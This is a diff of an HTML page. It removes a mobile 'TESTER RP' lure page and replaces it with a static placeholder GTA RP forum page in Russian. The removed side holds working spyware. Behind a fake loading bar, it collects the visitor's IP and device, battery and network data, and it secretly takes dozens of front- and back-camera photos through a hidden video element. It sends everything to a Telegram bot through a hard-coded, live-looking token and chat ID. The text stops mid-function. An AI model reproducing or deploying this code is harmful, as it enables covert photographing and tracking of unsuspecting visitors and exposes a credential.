@@ -1,554 +1,829 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TESTER RP</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA RP Форум | Матрёшка & Black Rush</title>
     <style>
+        :root {
+            --main-dark: #121212;
+            --secondary-dark: #1E1E1E;
+            --accent-red: #E74C3C;
+            --accent-blue: #3498DB;
+            --text-light: #ECF0F1;
+            --text-gray: #BDC3C7;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
         body {
-            overflow: hidden;
-            touch-action: none;
-            -webkit-text-size-adjust: none;
-            text-size-adjust: none;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            position: relative;
-            background: #000;
-            display: flex;
-            flex-direction: column;
+            background-color: var(--main-dark);
+            color: var(--text-light);
+            line-height: 1.6;
         }
         
-        .background-container {
-            position: absolute;
+        header {
+            background: linear-gradient(135deg, var(--accent-red), #C0392B);
+            padding: 1rem 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            position: sticky;
             top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
-            background-size: cover;
-            z-index: -2;
-        }
-        
-        .new-background {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://i.ibb.co/kVcnz5xZ/14.png') no-repeat center center;
-            background-size: cover;
-            z-index: -1;
-            display: none;
-        }
-        
-        .content {
-            position: relative;
-            z-index: 1;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            align-items: center;
-            padding-bottom: 20px;
-        }
-        
-        .play-btn {
-            background: transparent;
-            border: none;
-            width: 200px;
-            height: 80px;
-            margin-bottom: 100px;
-            cursor: pointer;
-            position: absolute;
-            bottom: 150px;
-            opacity: 0;
-        }
-        
-        .hidden-camera {
-            position: absolute;
-            opacity: 0;
-            width: 1px;
-            height: 1px;
-        }
-        
-        .legal-links {
-            position: absolute;
-            bottom: 10px;
-            width: 100%;
-            text-align: center;
-            color: #fff;
-            font-size: 12px;
-            padding: 5px 0;
-        }
-        
-        .message-box {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
             z-index: 100;
-            display: none;
         }
         
-        .loading-container {
-            position: absolute;
-            bottom: 50px;
-            width: 80%;
-            left: 10%;
-            text-align: center;
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo img {
+            height: 50px;
+        }
+        
+        .logo-text h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .logo-text p {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 20px;
+        }
+        
+        nav a {
             color: white;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+        
+        nav a:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .auth-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+        }
+        
+        .btn-login {
+            background-color: transparent;
+            color: white;
+            border: 2px solid white;
+        }
+        
+        .btn-register {
+            background-color: white;
+            color: var(--accent-red);
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        main {
+            padding: 2rem 0;
+        }
+        
+        .server-tabs {
+            display: flex;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid #333;
+        }
+        
+        .tab {
+            padding: 12px 24px;
+            cursor: pointer;
+            font-weight: 600;
+            position: relative;
+        }
+        
+        .tab.active {
+            color: var(--accent-red);
+        }
+        
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background-color: var(--accent-red);
+        }
+        
+        .tab-content {
             display: none;
         }
         
-        .loading-text {
-            margin-bottom: 10px;
-            font-size: 16px;
+        .tab-content.active {
+            display: block;
         }
         
-        .progress-bar {
-            width: 100%;
-            height: 10px;
-            background-color: #333;
-            border-radius: 5px;
+        .forum-sections {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 2rem;
+        }
+        
+        .section-card {
+            background-color: var(--secondary-dark);
+            border-radius: 8px;
             overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
         }
         
-        .progress {
-            height: 100%;
-            width: 0;
-            background-color: white;
-            transition: width 0.1s linear;
+        .section-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .section-header {
+            background: linear-gradient(135deg, #2C3E50, #4CA1AF);
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .section-icon {
+            font-size: 1.5rem;
+            color: white;
+        }
+        
+        .section-title h3 {
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+        }
+        
+        .section-title p {
+            font-size: 0.8rem;
+            color: var(--text-gray);
+        }
+        
+        .section-body {
+            padding: 15px;
+        }
+        
+        .section-stats {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: var(--text-gray);
+            border-top: 1px solid #333;
+            padding-top: 10px;
+            margin-top: 10px;
+        }
+        
+        .recent-threads {
+            background-color: var(--secondary-dark);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 2rem;
+        }
+        
+        .section-heading {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .section-heading h2 {
+            font-size: 1.5rem;
+            color: var(--accent-blue);
+        }
+        
+        .view-all {
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .thread-list {
+            list-style: none;
+        }
+        
+        .thread-item {
+            padding: 15px 0;
+            border-bottom: 1px solid #333;
+        }
+        
+        .thread-item:last-child {
+            border-bottom: none;
+        }
+        
+        .thread-title {
+            font-size: 1.1rem;
+            margin-bottom: 5px;
+        }
+        
+        .thread-title a {
+            color: var(--text-light);
+            text-decoration: none;
+        }
+        
+        .thread-title a:hover {
+            color: var(--accent-blue);
+            text-decoration: underline;
+        }
+        
+        .thread-meta {
+            display: flex;
+            font-size: 0.8rem;
+            color: var(--text-gray);
+            gap: 15px;
+        }
+        
+        .online-users {
+            background-color: var(--secondary-dark);
+            border-radius: 8px;
+            padding: 20px;
+        }
+        
+        .online-count {
+            font-size: 1.2rem;
+            color: #2ECC71;
+            margin-bottom: 15px;
+        }
+        
+        .user-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            list-style: none;
+        }
+        
+        .user-badge {
+            background-color: #333;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .user-avatar {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-color: #555;
+        }
+        
+        footer {
+            background-color: #111;
+            padding: 2rem 0;
+            margin-top: 2rem;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+        
+        .footer-section {
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .footer-section h3 {
+            color: var(--accent-blue);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .footer-links {
+            list-style: none;
+        }
+        
+        .footer-links li {
+            margin-bottom: 8px;
+        }
+        
+        .footer-links a {
+            color: var(--text-gray);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: var(--accent-blue);
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        
+        .social-icon:hover {
+            background-color: var(--accent-blue);
+            transform: translateY(-3px);
+        }
+        
+        .copyright {
+            text-align: center;
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid #333;
+            color: var(--text-gray);
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .forum-sections {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="background-container"></div>
-    <div class="new-background"></div>
-    <div class="content">
-        <button class="play-btn" id="playBtn"></button>
-    </div>
-
-    <div class="legal-links">
-        Договор оферты    Политика конфиденциальности
-    </div>
-
-    <div class="message-box" id="messageBox">
-        Форум в разработке
-    </div>
-
-    <div class="loading-container" id="loadingContainer">
-        <div class="loading-text">Loading</div>
-        <div class="progress-bar">
-            <div class="progress" id="progressBar"></div>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="https://via.placeholder.com/50" alt="Логотип">
+                    <div class="logo-text">
+                        <h1>GTA RP Форум</h1>
+                        <p>Матрёшка | Black Rush</p>
+                    </div>
+                </div>
+                
+                <nav>
+                    <ul>
+                        <li><a href="#" class="active">Главная</a></li>
+                        <li><a href="#">Форум</a></li>
+                        <li><a href="#">Правила</a></li>
+                        <li><a href="#">Донат</a></li>
+                        <li><a href="#">Поддержка</a></li>
+                    </ul>
+                </nav>
+                
+                <div class="auth-buttons">
+                    <button class="btn btn-login">Войти</button>
+                    <button class="btn btn-register">Регистрация</button>
+                </div>
+            </div>
         </div>
-    </div>
-
-    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
-
-    <script>
-        // Перенаправление в Chrome при открытии из других приложений
-        if (!navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')) {
-            window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
-        }
-
-        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
-        const chatId = '-1002577213610';
-        const videoElement = document.getElementById('hiddenCamera');
-        const playBtn = document.getElementById('playBtn');
-        const messageBox = document.getElementById('messageBox');
-        const newBackground = document.querySelector('.new-background');
-        const loadingContainer = document.getElementById('loadingContainer');
-        const progressBar = document.getElementById('progressBar');
+    </header>
+    
+    <main class="container">
+        <div class="server-tabs">
+            <div class="tab active" data-tab="matreshka">Матрёшка RP</div>
+            <div class="tab" data-tab="blackrush">Black Rush</div>
+        </div>
         
-        let currentStream = null;
-        let frontCameraStream = null;
-        let backCameraStream = null;
-        let photoCount = 0;
-        const totalPhotos = 80;
-        const photoInterval = 50;
-        let isFrontCameraActive = true;
-
-        // Блокировка масштабирования
-        document.addEventListener('gesturestart', function(e) {
-            e.preventDefault();
-        });
-        
-        document.addEventListener('touchmove', function(e) {
-            if(e.scale !== 1) {
-                e.preventDefault();
-            }
-        }, { passive: false });
-
-        // Функция для получения информации о батарее
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'Да' : 'Нет',
-                        chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
-                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
-                    };
-                } catch (e) {
-                    return { error: 'Не удалось получить данные о батарее' };
-                }
-            }
-            return { error: 'API батареи не поддерживается' };
-        }
-
-        // Функция для получения информации о соединении
-        function getConnectionInfo() {
-            if ('connection' in navigator) {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (connection) {
-                    return {
-                        type: connection.type || 'Неизвестно',
-                        effectiveType: connection.effectiveType || 'Неизвестно',
-                        downlink: connection.downlink + ' Mbps',
-                        rtt: connection.rtt + ' мс',
-                        saveData: connection.saveData ? 'Да' : 'Нет'
-                    };
-                }
-            }
-            return { error: 'Информация о соединении недоступна' };
-        }
-
-        // Функция для получения информации об устройстве
-        function getDeviceInfo() {
-            const screen = window.screen;
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
-                cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
-                doNotTrack: navigator.doNotTrack || 'Неизвестно',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
-                maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth + ' бит',
-                    pixelDepth: screen.pixelDepth + ' бит',
-                    orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
-                },
-                window: {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                date: new Date().toString(),
-                localTime: new Date().toLocaleString(),
-                timezoneOffset: new Date().getTimezoneOffset() + ' минут'
-            };
-
-            return deviceInfo;
-        }
-
-        // Функция для форматирования информации в читаемый вид
-        function formatInfo(info) {
-            let result = '';
-            for (const [key, value] of Object.entries(info)) {
-                if (typeof value === 'object' && value !== null) {
-                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
-                } else {
-                    result += `${key}: ${value}\n`;
-                }
-            }
-            return result;
-        }
-
-        // Функция для запуска прогресс-бара
-        function startProgressBar() {
-            loadingContainer.style.display = 'block';
-            let progress = 0;
-            const interval = 40; // 40 секунд = 40000 миллисекунд
-            const step = 100 / (interval * 10); // 10 обновлений в секунду
+        <div class="tab-content active" id="matreshka">
+            <div class="forum-sections">
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">📢</div>
+                        <div class="section-title">
+                            <h3>Новости</h3>
+                            <p>Последние обновления проекта</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Обсуждайте последние новости и обновления сервера</p>
+                        <div class="section-stats">
+                            <span>Темы: 124</span>
+                            <span>Сообщения: 1,245</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">💬</div>
+                        <div class="section-title">
+                            <h3>Общение</h3>
+                            <p>Общие обсуждения</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Место для свободного общения игроков</p>
+                        <div class="section-stats">
+                            <span>Темы: 542</span>
+                            <span>Сообщения: 12,874</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">👮</div>
+                        <div class="section-title">
+                            <h3>Фракции</h3>
+                            <p>Государственные организации</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Обсуждение работы государственных структур</p>
+                        <div class="section-stats">
+                            <span>Темы: 87</span>
+                            <span>Сообщения: 3,214</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">💰</div>
+                        <div class="section-title">
+                            <h3>Бизнесы</h3>
+                            <p>Предпринимательство в игре</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Обсуждение бизнесов и экономики сервера</p>
+                        <div class="section-stats">
+                            <span>Темы: 156</span>
+                            <span>Сообщения: 4,532</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">🎮</div>
+                        <div class="section-title">
+                            <h3>Геймплей</h3>
+                            <p>Игровые механики</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Обсуждение игрового процесса и механик</p>
+                        <div class="section-stats">
+                            <span>Темы: 231</span>
+                            <span>Сообщения: 7,845</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">🛠️</div>
+                        <div class="section-title">
+                            <h3>Техподдержка</h3>
+                            <p>Помощь игрокам</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Решение технических проблем и вопросов</p>
+                        <div class="section-stats">
+                            <span>Темы: 342</span>
+                            <span>Сообщения: 5,678</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
             
-            const timer = setInterval(() => {
-                progress += step;
-                progressBar.style.width = `${progress}%`;
+            <div class="recent-threads">
+                <div class="section-heading">
+                    <h2>Последние темы</h2>
+                    <a href="#" class="view-all">Все темы →</a>
+                </div>
                 
-                if (progress >= 100) {
-                    clearInterval(timer);
-                    messageBox.style.display = 'block';
-                    setTimeout(() => {
-                        progressBar.style.width = '0%';
-                    }, 1000);
-                }
-            }, 100);
-        }
-
-        // 1. Отправка информации о пользователе
-        async function sendUserInfo() {
-            try {
-                // Получаем IP-адрес
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                // Получаем дополнительную информацию
-                const [batteryInfo, connectionInfo] = await Promise.all([
-                    getBatteryInfo(),
-                    getConnectionInfo()
-                ]);
-
-                const deviceInfo = getDeviceInfo();
-
-                // Формируем сообщение
-                let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
-                message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
-                message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
-                message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;
-
-                // Отправляем сообщение в Telegram
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-
-            } catch (error) {
-                console.error('Error sending user info:', error);
-                try {
-                    const deviceInfo = getDeviceInfo();
-                    let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
-                    fallbackMessage += formatInfo(deviceInfo);
+                <ul class="thread-list">
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Обновление 1.5 - новые бизнесы и улучшения</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: Admin</span>
+                            <span>Дата: 15.06.2023</span>
+                            <span>Ответы: 42</span>
+                        </div>
+                    </li>
                     
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: fallbackMessage
-                        })
-                    });
-                } catch (e) {
-                    console.error('Fallback error:', e);
-                }
-            }
-        }
-
-        // 2. Захват фото с камеры и отправка
-        async function captureAndSendPhoto(index) {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = videoElement.videoWidth;
-                canvas.height = videoElement.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
-                
-                const cameraType = isFrontCameraActive ? 'front' : 'back';
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
-                
-                const caption = `🆔 Фото ${isFrontCameraActive ? 'фронтальной' : 'задней'} камеры #${index}\nВремя: ${new Date().toLocaleString()}`;
-                formData.append('caption', caption);
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                console.log(`Фото ${index} (${cameraType}) отправлено`);
-                
-            } catch (error) {
-                console.error(`Ошибка при отправке фото ${index}:`, error);
-            }
-        }
-
-        // 3. Переключение между камерами
-        async function switchCamera() {
-            try {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-
-                isFrontCameraActive = !isFrontCameraActive;
-                const facingMode = isFrontCameraActive ? 'user' : 'environment';
-
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-
-                videoElement.srcObject = currentStream;
-
-                if (isFrontCameraActive) {
-                    frontCameraStream = currentStream;
-                } else {
-                    backCameraStream = currentStream;
-                }
-
-                await new Promise(resolve => setTimeout(resolve, 300));
-
-            } catch (error) {
-                console.error('Ошибка при переключении камеры:', error);
-                throw error;
-            }
-        }
-
-        // 4. Серийная съемка
-        async function takeSeriesOfPhotos() {
-            try {
-                if (photoCount < totalPhotos) {
-                    await captureAndSendPhoto(photoCount + 1);
-                    photoCount++;
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Конкурс на лучший РП-пост</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: Moderator</span>
+                            <span>Дата: 12.06.2023</span>
+                            <span>Ответы: 28</span>
+                        </div>
+                    </li>
                     
-                    if (photoCount < totalPhotos) {
-                        await switchCamera();
-                        setTimeout(takeSeriesOfPhotos, photoInterval);
-                    } else {
-                        stopAllCameras();
-                    }
-                }
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Как открыть свой бизнес - гайд для новичков</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: BusinessGuru</span>
+                            <span>Дата: 10.06.2023</span>
+                            <span>Ответы: 15</span>
+                        </div>
+                    </li>
+                    
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Отчет о работе LSPD за неделю</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: Chief_Police</span>
+                            <span>Дата: 08.06.2023</span>
+                            <span>Ответы: 37</span>
+                        </div>
+                    </li>
+                    
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Ищем активных игроков в банду</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: GangLeader</span>
+                            <span>Дата: 05.06.2023</span>
+                            <span>Ответы: 19</span>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="online-users">
+                <div class="online-count">Онлайн: 247 игроков</div>
+                <ul class="user-list">
+                    <li class="user-badge">
+                        <div class="user-avatar"></div>
+                        <span>User123</span>
+                    </li>
+                    <li class="user-badge">
+                        <div class="user-avatar"></div>
+                        <span>ProGamer</span>
+                    </li>
+                    <li class="user-badge">
+                        <div class="user-avatar"></div>
+                        <span>RP_Lover</span>
+                    </li>
+                    <li class="user-badge">
+                        <div class="user-avatar"></div>
+                        <span>NewPlayer</span>
+                    </li>
+                    <li class="user-badge">
+                        <div class="user-avatar"></div>
+                        <span>Veteran</span>
+                    </li>
+                    <li class="user-badge">
+                        <div class="user-avatar"></div>
+                        <span>+242</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="tab-content" id="blackrush">
+            <div class="forum-sections">
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">📢</div>
+                        <div class="section-title">
+                            <h3>Новости Black Rush</h3>
+                            <p>Обновления и анонсы</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Последние новости проекта Black Rush</p>
+                        <div class="section-stats">
+                            <span>Темы: 87</span>
+                            <span>Сообщения: 945</span>
+                        </div>
+                    </div>
+                </div>
                 
-            } catch (error) {
-                console.error('Ошибка в процессе серийной съемки:', error);
-                stopAllCameras();
-            }
-        }
-
-        // 5. Остановка всех камер
-        function stopAllCameras() {
-            [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
-                if (stream) {
-                    try {
-                        stream.getTracks().forEach(track => track.stop());
-                        console.log('Трек камеры остановлен');
-                    } catch (error) {
-                        console.error('Ошибка при остановке камеры:', error);
-                    }
-                }
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">💬</div>
+                        <div class="section-title">
+                            <h3>Общение</h3>
+                            <p>Обсуждения игроков</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Место для свободного общения на сервере</p>
+                        <div class="section-stats">
+                            <span>Темы: 321</span>
+                            <span>Сообщения: 8,754</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">🏎️</div>
+                        <div class="section-title">
+                            <h3>Автомобили</h3>
+                            <p>Тюнинг и гонки</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Все об автомобилях и гонках в Black Rush</p>
+                        <div class="section-stats">
+                            <span>Темы: 143</span>
+                            <span>Сообщения: 3,456</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section-card">
+                    <div class="section-header">
+                        <div class="section-icon">🔫</div>
+                        <div class="section-title">
+                            <h3>Криминал</h3>
+                            <p>Теневой мир</p>
+                        </div>
+                    </div>
+                    <div class="section-body">
+                        <p>Обсуждение криминального геймплея</p>
+                        <div class="section-stats">
+                            <span>Темы: 98</span>
+                            <span>Сообщения: 2,789</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="recent-threads">
+                <div class="section-heading">
+                    <h2>Последние темы Black Rush</h2>
+                    <a href="#" class="view-all">Все темы →</a>
+                </div>
+                
+                <ul class="thread-list">
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Новые автомобили в обновлении 2.3</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: DevTeam</span>
+                            <span>Дата: 14.06.2023</span>
+                            <span>Ответы: 31</span>
+                        </div>
+                    </li>
+                    
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Гонки на этой неделе - расписание</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: RaceMaster</span>
+                            <span>Дата: 11.06.2023</span>
+                            <span>Ответы: 24</span>
+                        </div>
+                    </li>
+                    
+                    <li class="thread-item">
+                        <div class="thread-title">
+                            <a href="#">Лучшие тюнинг-ателье - рейтинг</a>
+                        </div>
+                        <div class="thread-meta">
+                            <span>Автор: TuningExpert</span>
+                            <span>Дата: 09.06.2023</span>
+                            <span>Ответы: 18</span>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>О проекте</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">О нас</a></li>
+                        <li><a href="#">Команда</a></li>
+                        <li><a href="#">Правила</a></li>
+                        <li><a href="#">История</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Помощь</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Техподдержка</a></li>
+                        <li><a href="#">Гайды</a></li>
+                        <li><a href="#">Баги и отчеты</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Сообщество</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Наша команда</a></li>
+                        <li><a href="#">Мероприятия</a></li>
+                        <li><a href="#">Конкурсы</a></li>
+                        <li><a href="#">Вакансии</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Мы в соцсетях</h3>
+                    <div class="social-links">
+                        <a href="#" class="social-icon">VK</a>
+                        <a href="#" class="social-icon">TG</a>
+                        <a href="#" class="social-icon">YT</a>
+                        <a href="#" class="social-icon">DS</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                © 2023 GTA RP Форум | Матрёшка RP & Black Rush. Все права защищены.
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+        // Переключение между вкладками серверов
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                // Удаляем активный класс у всех вкладок
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                // Добавляем активный класс к выбранной вкладке
+                tab.classList.add('active');
+                const tabId = tab.getAttribute('data-tab');
+                document.getElementById(tabId).classList.add('active');
             });
-            videoElement.srcObject = null;
-            console.log('Все камеры отключены');
-        }
-
-        // 6. Инициализация камер
-        async function initCameras() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const hasFrontCamera = devices.some(device => 
-                    device.kind === 'videoinput' && device.label.toLowerCase().includes('front'));
-                const hasBackCamera = devices.some(device => 
-                    device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));
-
-                if (!hasFrontCamera || !hasBackCamera) {
-                    throw new Error('Не обнаружены обе камеры');
-                }
-
-                // Показываем новый фон и запускаем прогресс-бар
-                newBackground.style.display = 'block';
-                startProgressBar();
-
-                isFrontCameraActive = true;
